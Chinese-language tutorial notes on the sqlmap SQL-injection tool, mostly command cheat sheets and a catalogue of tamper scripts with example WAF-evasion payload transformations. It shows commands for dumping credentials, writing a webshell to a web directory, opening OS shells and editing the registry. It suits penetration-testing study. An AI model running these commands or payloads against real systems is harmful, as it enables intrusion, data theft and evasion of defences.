# Sqlmap

<p align="center">
    <img src="../../../assets/img/logo/Sqlmap.png" width="25%">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**项目地址**
- https://github.com/sqlmapproject/sqlmap

**文章 & Reference**
- [Sqlmap使用教程[个人笔记精华整理] | 漏洞人生](http://www.vuln.cn/1992)
- [sqlmap用户手册[续]](http://drops.xmd5.com/static/drops/tips-401.html)
- [工具使用｜神器Sqlmap tamper的使用介绍](https://mp.weixin.qq.com/s/gOvVWcjyCZypdnNxHyPS2g)

---

## 基础使用

**检测注入**

```bash
sqlmap -u URL -v 3 --random-agent                       # 判断注入
sqlmap -u URL -p id                                     # 指定参数注入
sqlmap -u URL --cookie="xxxxx"                          # 带 cookie 注入
sqlmap -u URL --batch                                   # 不要请求用户输入,使用默认行为
sqlmap -r aaa.txt                                       # post 型注入

sqlmap -u URL --flush-session                           # 清除缓存

sqlmap -u URL --os "Windows"                            # 指定操作系统
sqlmap -u URL --dbms mysql --level 3                    # 指定数据库类型为 mysql,级别为 3(共 5 级,级别越高,检测越全面)
sqlmap -u URL --dbms Microsoft SQL Server
sqlmap -u URL --dbms mysql --risk 3                     # 指定执行测试的风险(1-3, 默认 1) 1会测试大部分的测试语句,2会增加基于事件的测试语句,3会增加 OR 语句的 SQL 注入测试
sqlmap -u URL --proxy "socks5://127.0.0.1:1080"         # 代理注入测试
sqlmap -u URL --batch --smart                           # 启发式判断注入
```

**获取信息**

```bash
sqlmap -u URL --current-db          # 获取当前数据库
sqlmap -u URL --dbs                 # 枚举所有数据库
sqlmap -u URL -f                    # 检查 DBMS 版本
sqlmap -u URL --is-dba              # 判断当前用户是否是 dba
sqlmap -u URL --users               # 列出数据库管理系统用户
sqlmap -u URL --privileges          # 枚举 DBMS 用户权限
sqlmap -u URL --passwords           # 获取当前数据库密码

sqlmap -u URL -D DATABASE --tables  # 获取数据库表
sqlmap -u URL -D DATABASE -T TABLES --columns           # 获取指定表的列名
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump   # 获取指定表的列名
sqlmap -u URL -dbms mysql -level 3 -D test -T admin -C "username,password" -dump    # dump 出字段 username 与 password 中的数据
sqlmap -u URL --dump-all            # 列出所有数据库,所有表内容
```

**搜索字段**

```bash
sqlmap -r "c:\tools\request.txt" -dbms mysql -D dedecms --search -C admin,password  # 在 dedecms 数据库中搜索字段 admin 或者 password.
```

**读取与写入文件**

首先找需要网站的物理路径,其次需要有可写或可读权限.

- -file-read=RFILE 从后端的数据库管理系统文件系统读取文件 (物理路径)
- -file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 (mssql xp_shell)
- -file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
```bash
sqlmap -r aaa.txt --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"

# 注 : mysql 不支持列目录,仅支持读取单个文件.sqlserver 可以列目录,不能读写文件,但需要一个 xp_dirtree 函数
```

**提权**

```bash
sqlmap -u URL --sql-shell                       # 获取一个 sql-shell 会话
sqlmap -u URL --os-shell                        # 获取一个 os-shell 会话
sqlmap -u URL --os-cmd=ipconfig                 # 在注入点直接执行命令
sqlmap -d "mssql://sa:sql123456@ip:1433/master" --os-shell  # 知道数据库密码后提权成为交互式系统shell
```

**对 Windows 注册表操作**

```bash
--reg-read                                      # 读取注册表值
--reg-add                                       # 写入注册表值
--reg-del                                       # 删除注册表值
--reg-key,--reg-value,--reg-data,--reg-type     # 注册表辅助选项

sqlmap -u URL --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
```

**预估完成时间**

```bash
--eta                                           # 计算注入数据的剩余时间
```

**测试 WAF/IPS/IDS 保护**

```bash
--identify-waf                                                      # 尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。
--mobile                                                            # 模仿智能手机
--referer "http://www.google.com"                                   # 模拟来源
--user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"    # 模拟谷歌蜘蛛
--skip-waf
```

**尝试 getshell**

```bash
sqlmap -d "mysql://root:root@192.168.1.1:3306/mysql" --os-shell
```

**宽字节检测**
```bash
sqlmap -u URL --dbms mysql --prefix "%df%27" --technique U -v 3     # 宽字节检测
```

**union 语句测试**
```bash
--union-cols=UCOLS  测试UNION查询的SQL注入的列的范围
--union-char=UCHAR  用来破解列数的字符
--union-from=UFROM  在UNION查询的FROM部分中使用的表
```

---

## tamper

用法
```
python sqlmap.py -u http://xx.xxx.xx.xx?id=1 --tamper xxx.py
```

### 0eunion.py

> Replaces instances of <int> UNION with <int>e0UNION

使用 `e0UNION` 替换 `UNION`

Requirement:
* MySQL
* MsSQL

Notes:
* Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

```py
>>> tamper('1 UNION ALL SELECT')
'1e0UNION ALL SELECT'
```

### apostrophemask.py

> Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)

将 `'` 替换成 UTF-8 urlencoded 的 `%EF%BC%87`

References:
* http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
* https://web.archive.org/web/20130614183121/http://lukasz.pilorz.net/testy/unicode_conversion/
* https://web.archive.org/web/20131121094431/sla.ckers.org/forum/read.php?13,11562,11850
* https://web.archive.org/web/20070624194958/http://lukasz.pilorz.net/testy/full_width_utf/index.phps

```py
>>> tamper("1 AND '1'='1")
'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
```

### apostrophenullencode.py

> Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)

将 `'` 替换成 `%00%27`

```py
>>> tamper("1 AND '1'='1")
'1 AND %00%271%00%27=%00%271'
```

### appendnullbyte.py

> Appends (Access) NULL byte character (%00) at the end of payload

在参数末尾加入 `%00`

Requirement:
* Microsoft Access

Reference
* http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection

```py
>>> tamper('1 AND 1=1')
'1 AND 1=1%00'
```

### base64encode.py

> Base64-encodes all characters in a given payload

base64 编码所有字符

```py
>>> tamper("1' AND SLEEP(5)#")
'MScgQU5EIFNMRUVQKDUpIw=='
```

### between.py

> Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'

将 `>` 字符替换为 NOT BETWEEN 0 AND

将 `=` 字符替换为 BETWEEN # AND #

```py
>>> tamper('1 AND A > B--')
'1 AND A NOT BETWEEN 0 AND B--'
>>> tamper('1 AND A = B--')
'1 AND A BETWEEN B AND B--'
>>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')
'1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'
```

### binary.py

> Injects keyword binary where possible

Requirement:
* MySQL

```py
>>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')
'1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'
>>> tamper('1 AND 2>1')
'1 AND binary 2>binary 1'
>>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')
'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END'
```

### bluecoat.py

> Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE

将 sql 语句后的空格字符替换为 `%09`，`LIKE` 替换字符 `=`

Requirement:
* Blue Coat SGOS with WAF activated as documented in https://kb.bluecoat.com/index?page=content&id=FAQ2147

Tested against:
* MySQL 5.1, SGOS

```py
>>> tamper('SELECT id FROM users WHERE id = 1')
'SELECT%09id FROM%09users WHERE%09id LIKE 1'
```

### chardoubleencode.py

> Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)

二次URL编码

```py
>>> tamper('SELECT FIELD FROM%20TABLE')
'%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'
```

### charencode.py

> URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)

URL编码

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

```py
>>> tamper('SELECT FIELD FROM%20TABLE')
'%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45'
```

### charunicodeencode.py

> Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)

URL编码

Requirement:
* ASP
* ASP.NET

Tested against:
* Microsoft SQL Server 2000
* Microsoft SQL Server 2005
* MySQL 5.1.56
* PostgreSQL 9.0.3

```py
>>> tamper('SELECT FIELD%20FROM TABLE')
'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'
```

### charunicodeescape.py

> Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)

url 解码中的 `%` 换成 `\\`

```py
>>> tamper('SELECT FIELD FROM TABLE')
'\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
```

### commalesslimit.py

> Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart

替换字符的位置

Requirement:
* MySQL

Tested against:
* MySQL 5.0 and 5.5

```py
>>> tamper('LIMIT 2, 3')
'LIMIT 3 OFFSET 2'
```

### commalessmid.py

> Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart

用 'MID(A FROM B FOR C)' 代替 'MID(A, B, C)'

Requirement:
* MySQL

Tested against:
* MySQL 5.0 and 5.5

```py
>>> tamper('MID(VERSION(), 1, 1)')
'MID(VERSION() FROM 1 FOR 1)'
```

### commentbeforeparentheses.py

> Prepends (inline) comment before parentheses (e.g. ( -> /**/()

在括号前添加内联注释

Tested against:
* Microsoft SQL Server
* MySQL
* Oracle
* PostgreSQL

```py
>>> tamper('SELECT ABS(1)')
'SELECT ABS/**/(1)'
```

### concat2concatws.py

> Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart

将 `concat(a,b)` 替换成 `concat_ws(mid(char(0),0,0),a,b)`

Requirement:
* MySQL

Tested against:
* MySQL 5.0

```py
>>> tamper('CONCAT(1,2)')
'CONCAT_WS(MID(CHAR(0),0,0),1,2)'
"""
```

### dunion.py

> Replaces instances of <int> UNION with <int>DUNION

将 `UNION` 换成 `DUNION`

Requirement:
* Oracle

Reference
* https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

```py
>>> tamper('1 UNION ALL SELECT')
'1DUNION ALL SELECT'
```

### equaltolike.py

> Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart

将 `=` 换成 `LIKE`

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5

```py
>>> tamper('SELECT * FROM users WHERE id=1')
'SELECT * FROM users WHERE id LIKE 1'
```

### equaltorlike.py

> Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart

将 `=` 换成 `RLIKE`

Tested against:
* MySQL 4, 5.0 and 5.5

```py
>>> tamper('SELECT * FROM users WHERE id=1')
'SELECT * FROM users WHERE id RLIKE 1'
```

### escapequotes.py

> Slash escape single and double quotes (e.g. ' -> \')

```py
>>> tamper('1" AND SLEEP(5)#')
'1\\\\" AND SLEEP(5)#'
```

### greatest.py

> Replaces greater than operator ('>') with 'GREATEST' counterpart

使用 `greatest` 替换 `>`

Tested against:
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

```py
>>> tamper('1 AND A > B')
'1 AND GREATEST(A,B+1)=A'
```

### halfversionedmorekeywords.py

> Adds (MySQL) versioned comment before each keyword

在每个关键词前添加(MySQL)的版本注释

Requirement:
* MySQL < 5.1

Tested against:
* MySQL 4.0.18, 5.0.22

```py
>>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
```

### hex2char.py

> Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart

用对应的 CONCAT(CHAR(),...) 替换每个 (MySQL)0x<hex> 编码的字符串。

Requirement:
* MySQL

Tested against:
* MySQL 4, 5.0 and 5.5

```py
>>> tamper('SELECT 0xdeadbeef')
'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))'
```

### htmlencode.py

> HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)

HTML编码（使用代码点）所有非字母数字字符（例如，`'`-> `&#39;`）。

```py
>>> tamper("1' AND SLEEP(5)#")
'1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'
```

### ifnull2casewhenisnull.py

> Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart

用 `'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END'` 代替 `'IFNULL(A, B)'` 这样的实例。

Requirement:
* MySQL
* SQLite (possibly)
* SAP MaxDB (possibly)

Tested against:
* MySQL 5.0 and 5.5

```py
>>> tamper('IFNULL(1, 2)')
'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END'
```

### ifnull2ifisnull.py

> Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart

用 `IF(ISNULL(A), B, A)` 代替 `IFNULL(A, B)` 这样的实例。

Requirement:
* MySQL
* SQLite (possibly)
* SAP MaxDB (possibly)

Tested against:
* MySQL 5.0 and 5.5

```py
>>> tamper('IFNULL(1, 2)')
'IF(ISNULL(1),2,1)'
```

### informationschemacomment.py

> Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier

在所有出现的（MySQL）`"information_schema"` 标识符的末尾添加一个内联注释（`/**/`）。

```py
>>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')
'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'
```

### least.py

> Replaces greater than operator ('>') with 'LEAST' counterpart

用 `LEAST` 代替大于运算符（`>`）。

Tested against:
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

```py
>>> tamper('1 AND A > B')
'1 AND LEAST(A,B+1)=B+1'
```

### lowercase.py

> Replaces each keyword character with lower case value (e.g. SELECT -> select)

用小写字母值替换每个关键词字符（例如：`SELECT` -> `select`）。

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

```py
>>> tamper('INSERT')
'insert'
```

### luanginx.py

> LUA-Nginx WAFs Bypass (e.g. Cloudflare)

Reference:
* https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/

```py
>>> random.seed(0); hints={}; payload = tamper("1 AND 2>1", hints=hints); "%s&%s" % (hints[HINT.PREPEND], payload)
'34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1'
```

### misunion.py

> Replaces instances of UNION with -.1UNION

`UNION` 修改为 `-.1UNION`

Requirement:
* MySQL

Reference
* https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf

```py
>>> tamper('1 UNION ALL SELECT')
'1-.1UNION ALL SELECT'
>>> tamper('1" UNION ALL SELECT')
'1"-.1UNION ALL SELECT'
```

### modsecurityversioned.py

> Embraces complete query with (MySQL) versioned comment

Requirement:
* MySQL

Tested against:
* MySQL 5.0

```py
>>> import random
>>> random.seed(0)
>>> tamper('1 AND 2>1--')
'1 /*!30963AND 2>1*/--'
```

### modsecurityzeroversioned.py

> Embraces complete query with (MySQL) zero-versioned comment

Requirement:
* MySQL

Tested against:
* MySQL 5.0

```py
>>> tamper('1 AND 2>1--')
'1 /*!00000AND 2>1*/--'
```

### multiplespaces.py

> Adds multiple spaces (' ') around SQL keywords

在sql关键字周围添加多个空格

Reference
* https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt

```py
>>> random.seed(0)
>>> tamper('1 UNION SELECT foobar')
'1     UNION     SELECT     foobar'
```

### overlongutf8.py

> Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)

将给定的有效载荷中的所有（非字母）字符转换为超长 UTF8（不处理已经编码的）（例如 `'` -> `%C0%A7`）

Reference:
* https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/
* https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/

```py
>>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1'
```

### overlongutf8more.py

> Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)

Reference:
* https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/
* https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/

```py
>>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
'%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1'
```

### percentage.py

> Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)

在每一个字符前面添加一个百分比符号

Requirement:
* ASP

Tested against:
* Microsoft SQL Server 2000, 2005
* MySQL 5.1.56, 5.5.11
* PostgreSQL 9.0

```py
>>> tamper('SELECT FIELD FROM TABLE')
'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'
```

### plus2concat.py

> Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart

用对应的 (MsSQL) 函数 CONCAT() 代替加号运算符('+')。

Tested against:
* Microsoft SQL Server 2012

Requirements:
* Microsoft SQL Server 2012+

```py
>>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'

>>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')
'1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe'
```

### plus2fnconcat.py

> Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart

Tested against:
* Microsoft SQL Server 2008

Requirements:
* Microsoft SQL Server 2008+

Notes:
* Useful in case ('+') character is filtered
* https://msdn.microsoft.com/en-us/library/bb630290.aspx

```py
>>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'

>>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')
'1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe'
```

### randomcase.py

> Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)

字符替换成大小写字符

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0
* SQLite 3

```py
>>> import random
>>> random.seed(0)
>>> tamper('INSERT')
'InSeRt'
>>> tamper('f()')
'f()'
>>> tamper('function()')
'FuNcTiOn()'
>>> tamper('SELECT id FROM `user`')
'SeLeCt id FrOm `user`'
```

### randomcomments.py

> Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)

在关键字添加内联注释 `//`

```py
>>> import random
>>> random.seed(0)
>>> tamper('INSERT')
'I/**/NS/**/ERT'
```

### schemasplit.py

> Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')

将 FROM 模式标识符（如 `testdb.users` ）与空白处分割（如 `testdb 9.e.users` ）。

Requirement:
* MySQL

Reference:
* https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

```py
>>> tamper('SELECT id FROM testdb.users')
'SELECT id FROM testdb 9.e.users'
```

### sleep2getlock.py

> Replaces instances like 'SLEEP(5)' with (e.g.) "GET_LOCK('ETgP',5)"

用 `GET_LOCK('ETgP',5)` 取代 `SLEEP(5)`

Requirement:
* MySQL

Tested against:
* MySQL 5.0 and 5.5

Reference:
* https://zhuanlan.zhihu.com/p/35245598

```py
>>> tamper('SLEEP(5)') == "GET_LOCK('%s',5)" % kb.aliasName
True
```

### sp_password.py

> Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs

将 sp_password 附加到有效负载的末尾，用来混淆

Requirement:
* MSSQL

Reference:
* http://websec.ca/kb/sql_injection

```py
>>> tamper('1 AND 9227=9227-- ')
'1 AND 9227=9227-- sp_password'
```

### space2comment.py

> Replaces space character (' ') with comments '/**/'

空格替换成//

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

```py
>>> tamper('SELECT id FROM users')
'SELECT/**/id/**/FROM/**/users'
```

### space2dash.py

> Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')

用一个注释（'--'）代替空格字符（''），后面是一个随机字符串和一个新行（'/n'）。

Requirement:
* MSSQL
* SQLite

Reference:
* https://proton.onsec.ru/contest/

```py
>>> random.seed(0)
>>> tamper('1 AND 9227=9227')
'1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227'
```

### space2hash.py

> Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')

用（'#'）字符替换（MySQL）空格字符（''）的实例，后面是一个随机字符串和一个新行（'/n'）。

Requirement:
* MySQL

Tested against:
* MySQL 4.0, 5.0

```py
>>> random.seed(0)
>>> tamper('1 AND 9227=9227')
'1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227'
```

### space2morecomment.py

> Replaces (MySQL) instances of space character (' ') with comments '/**_**/'

空格替换成/ /

Tested against:
* MySQL 5.0 and 5.5

```py
>>> tamper('SELECT id FROM users')
'SELECT/**_**/id/**_**/FROM/**_**/users'
```

### space2morehash.py

> Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')

用（'#'）字符替换（MySQL）空格字符（''）的实例，后面是一个随机字符串和一个新行（'/n'）。

Requirement:
* MySQL >= 5.1.13

Tested against:
* MySQL 5.1.41

```py
>>> random.seed(0)
>>> tamper('1 AND 9227=9227')
'1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227'
```

### space2mssqlblank.py

> Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters

将(MsSQL)空格字符('')的实例替换为一个有效的备用字符集中的随机空白字符。

Requirement:
* Microsoft SQL Server

Tested against:
* Microsoft SQL Server 2000
* Microsoft SQL Server 2005

```py
>>> random.seed(0)
>>> tamper('SELECT id FROM users')
'SELECT%0Did%0DFROM%04users'
```

### space2mssqlhash.py

> Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')

将空格替换成 `%23%0A`

Requirement:
* MSSQL
* MySQL

```py
>>> tamper('1 AND 9227=9227')
'1%23%0AAND%23%0A9227=9227'
```

### space2mysqlblank.py

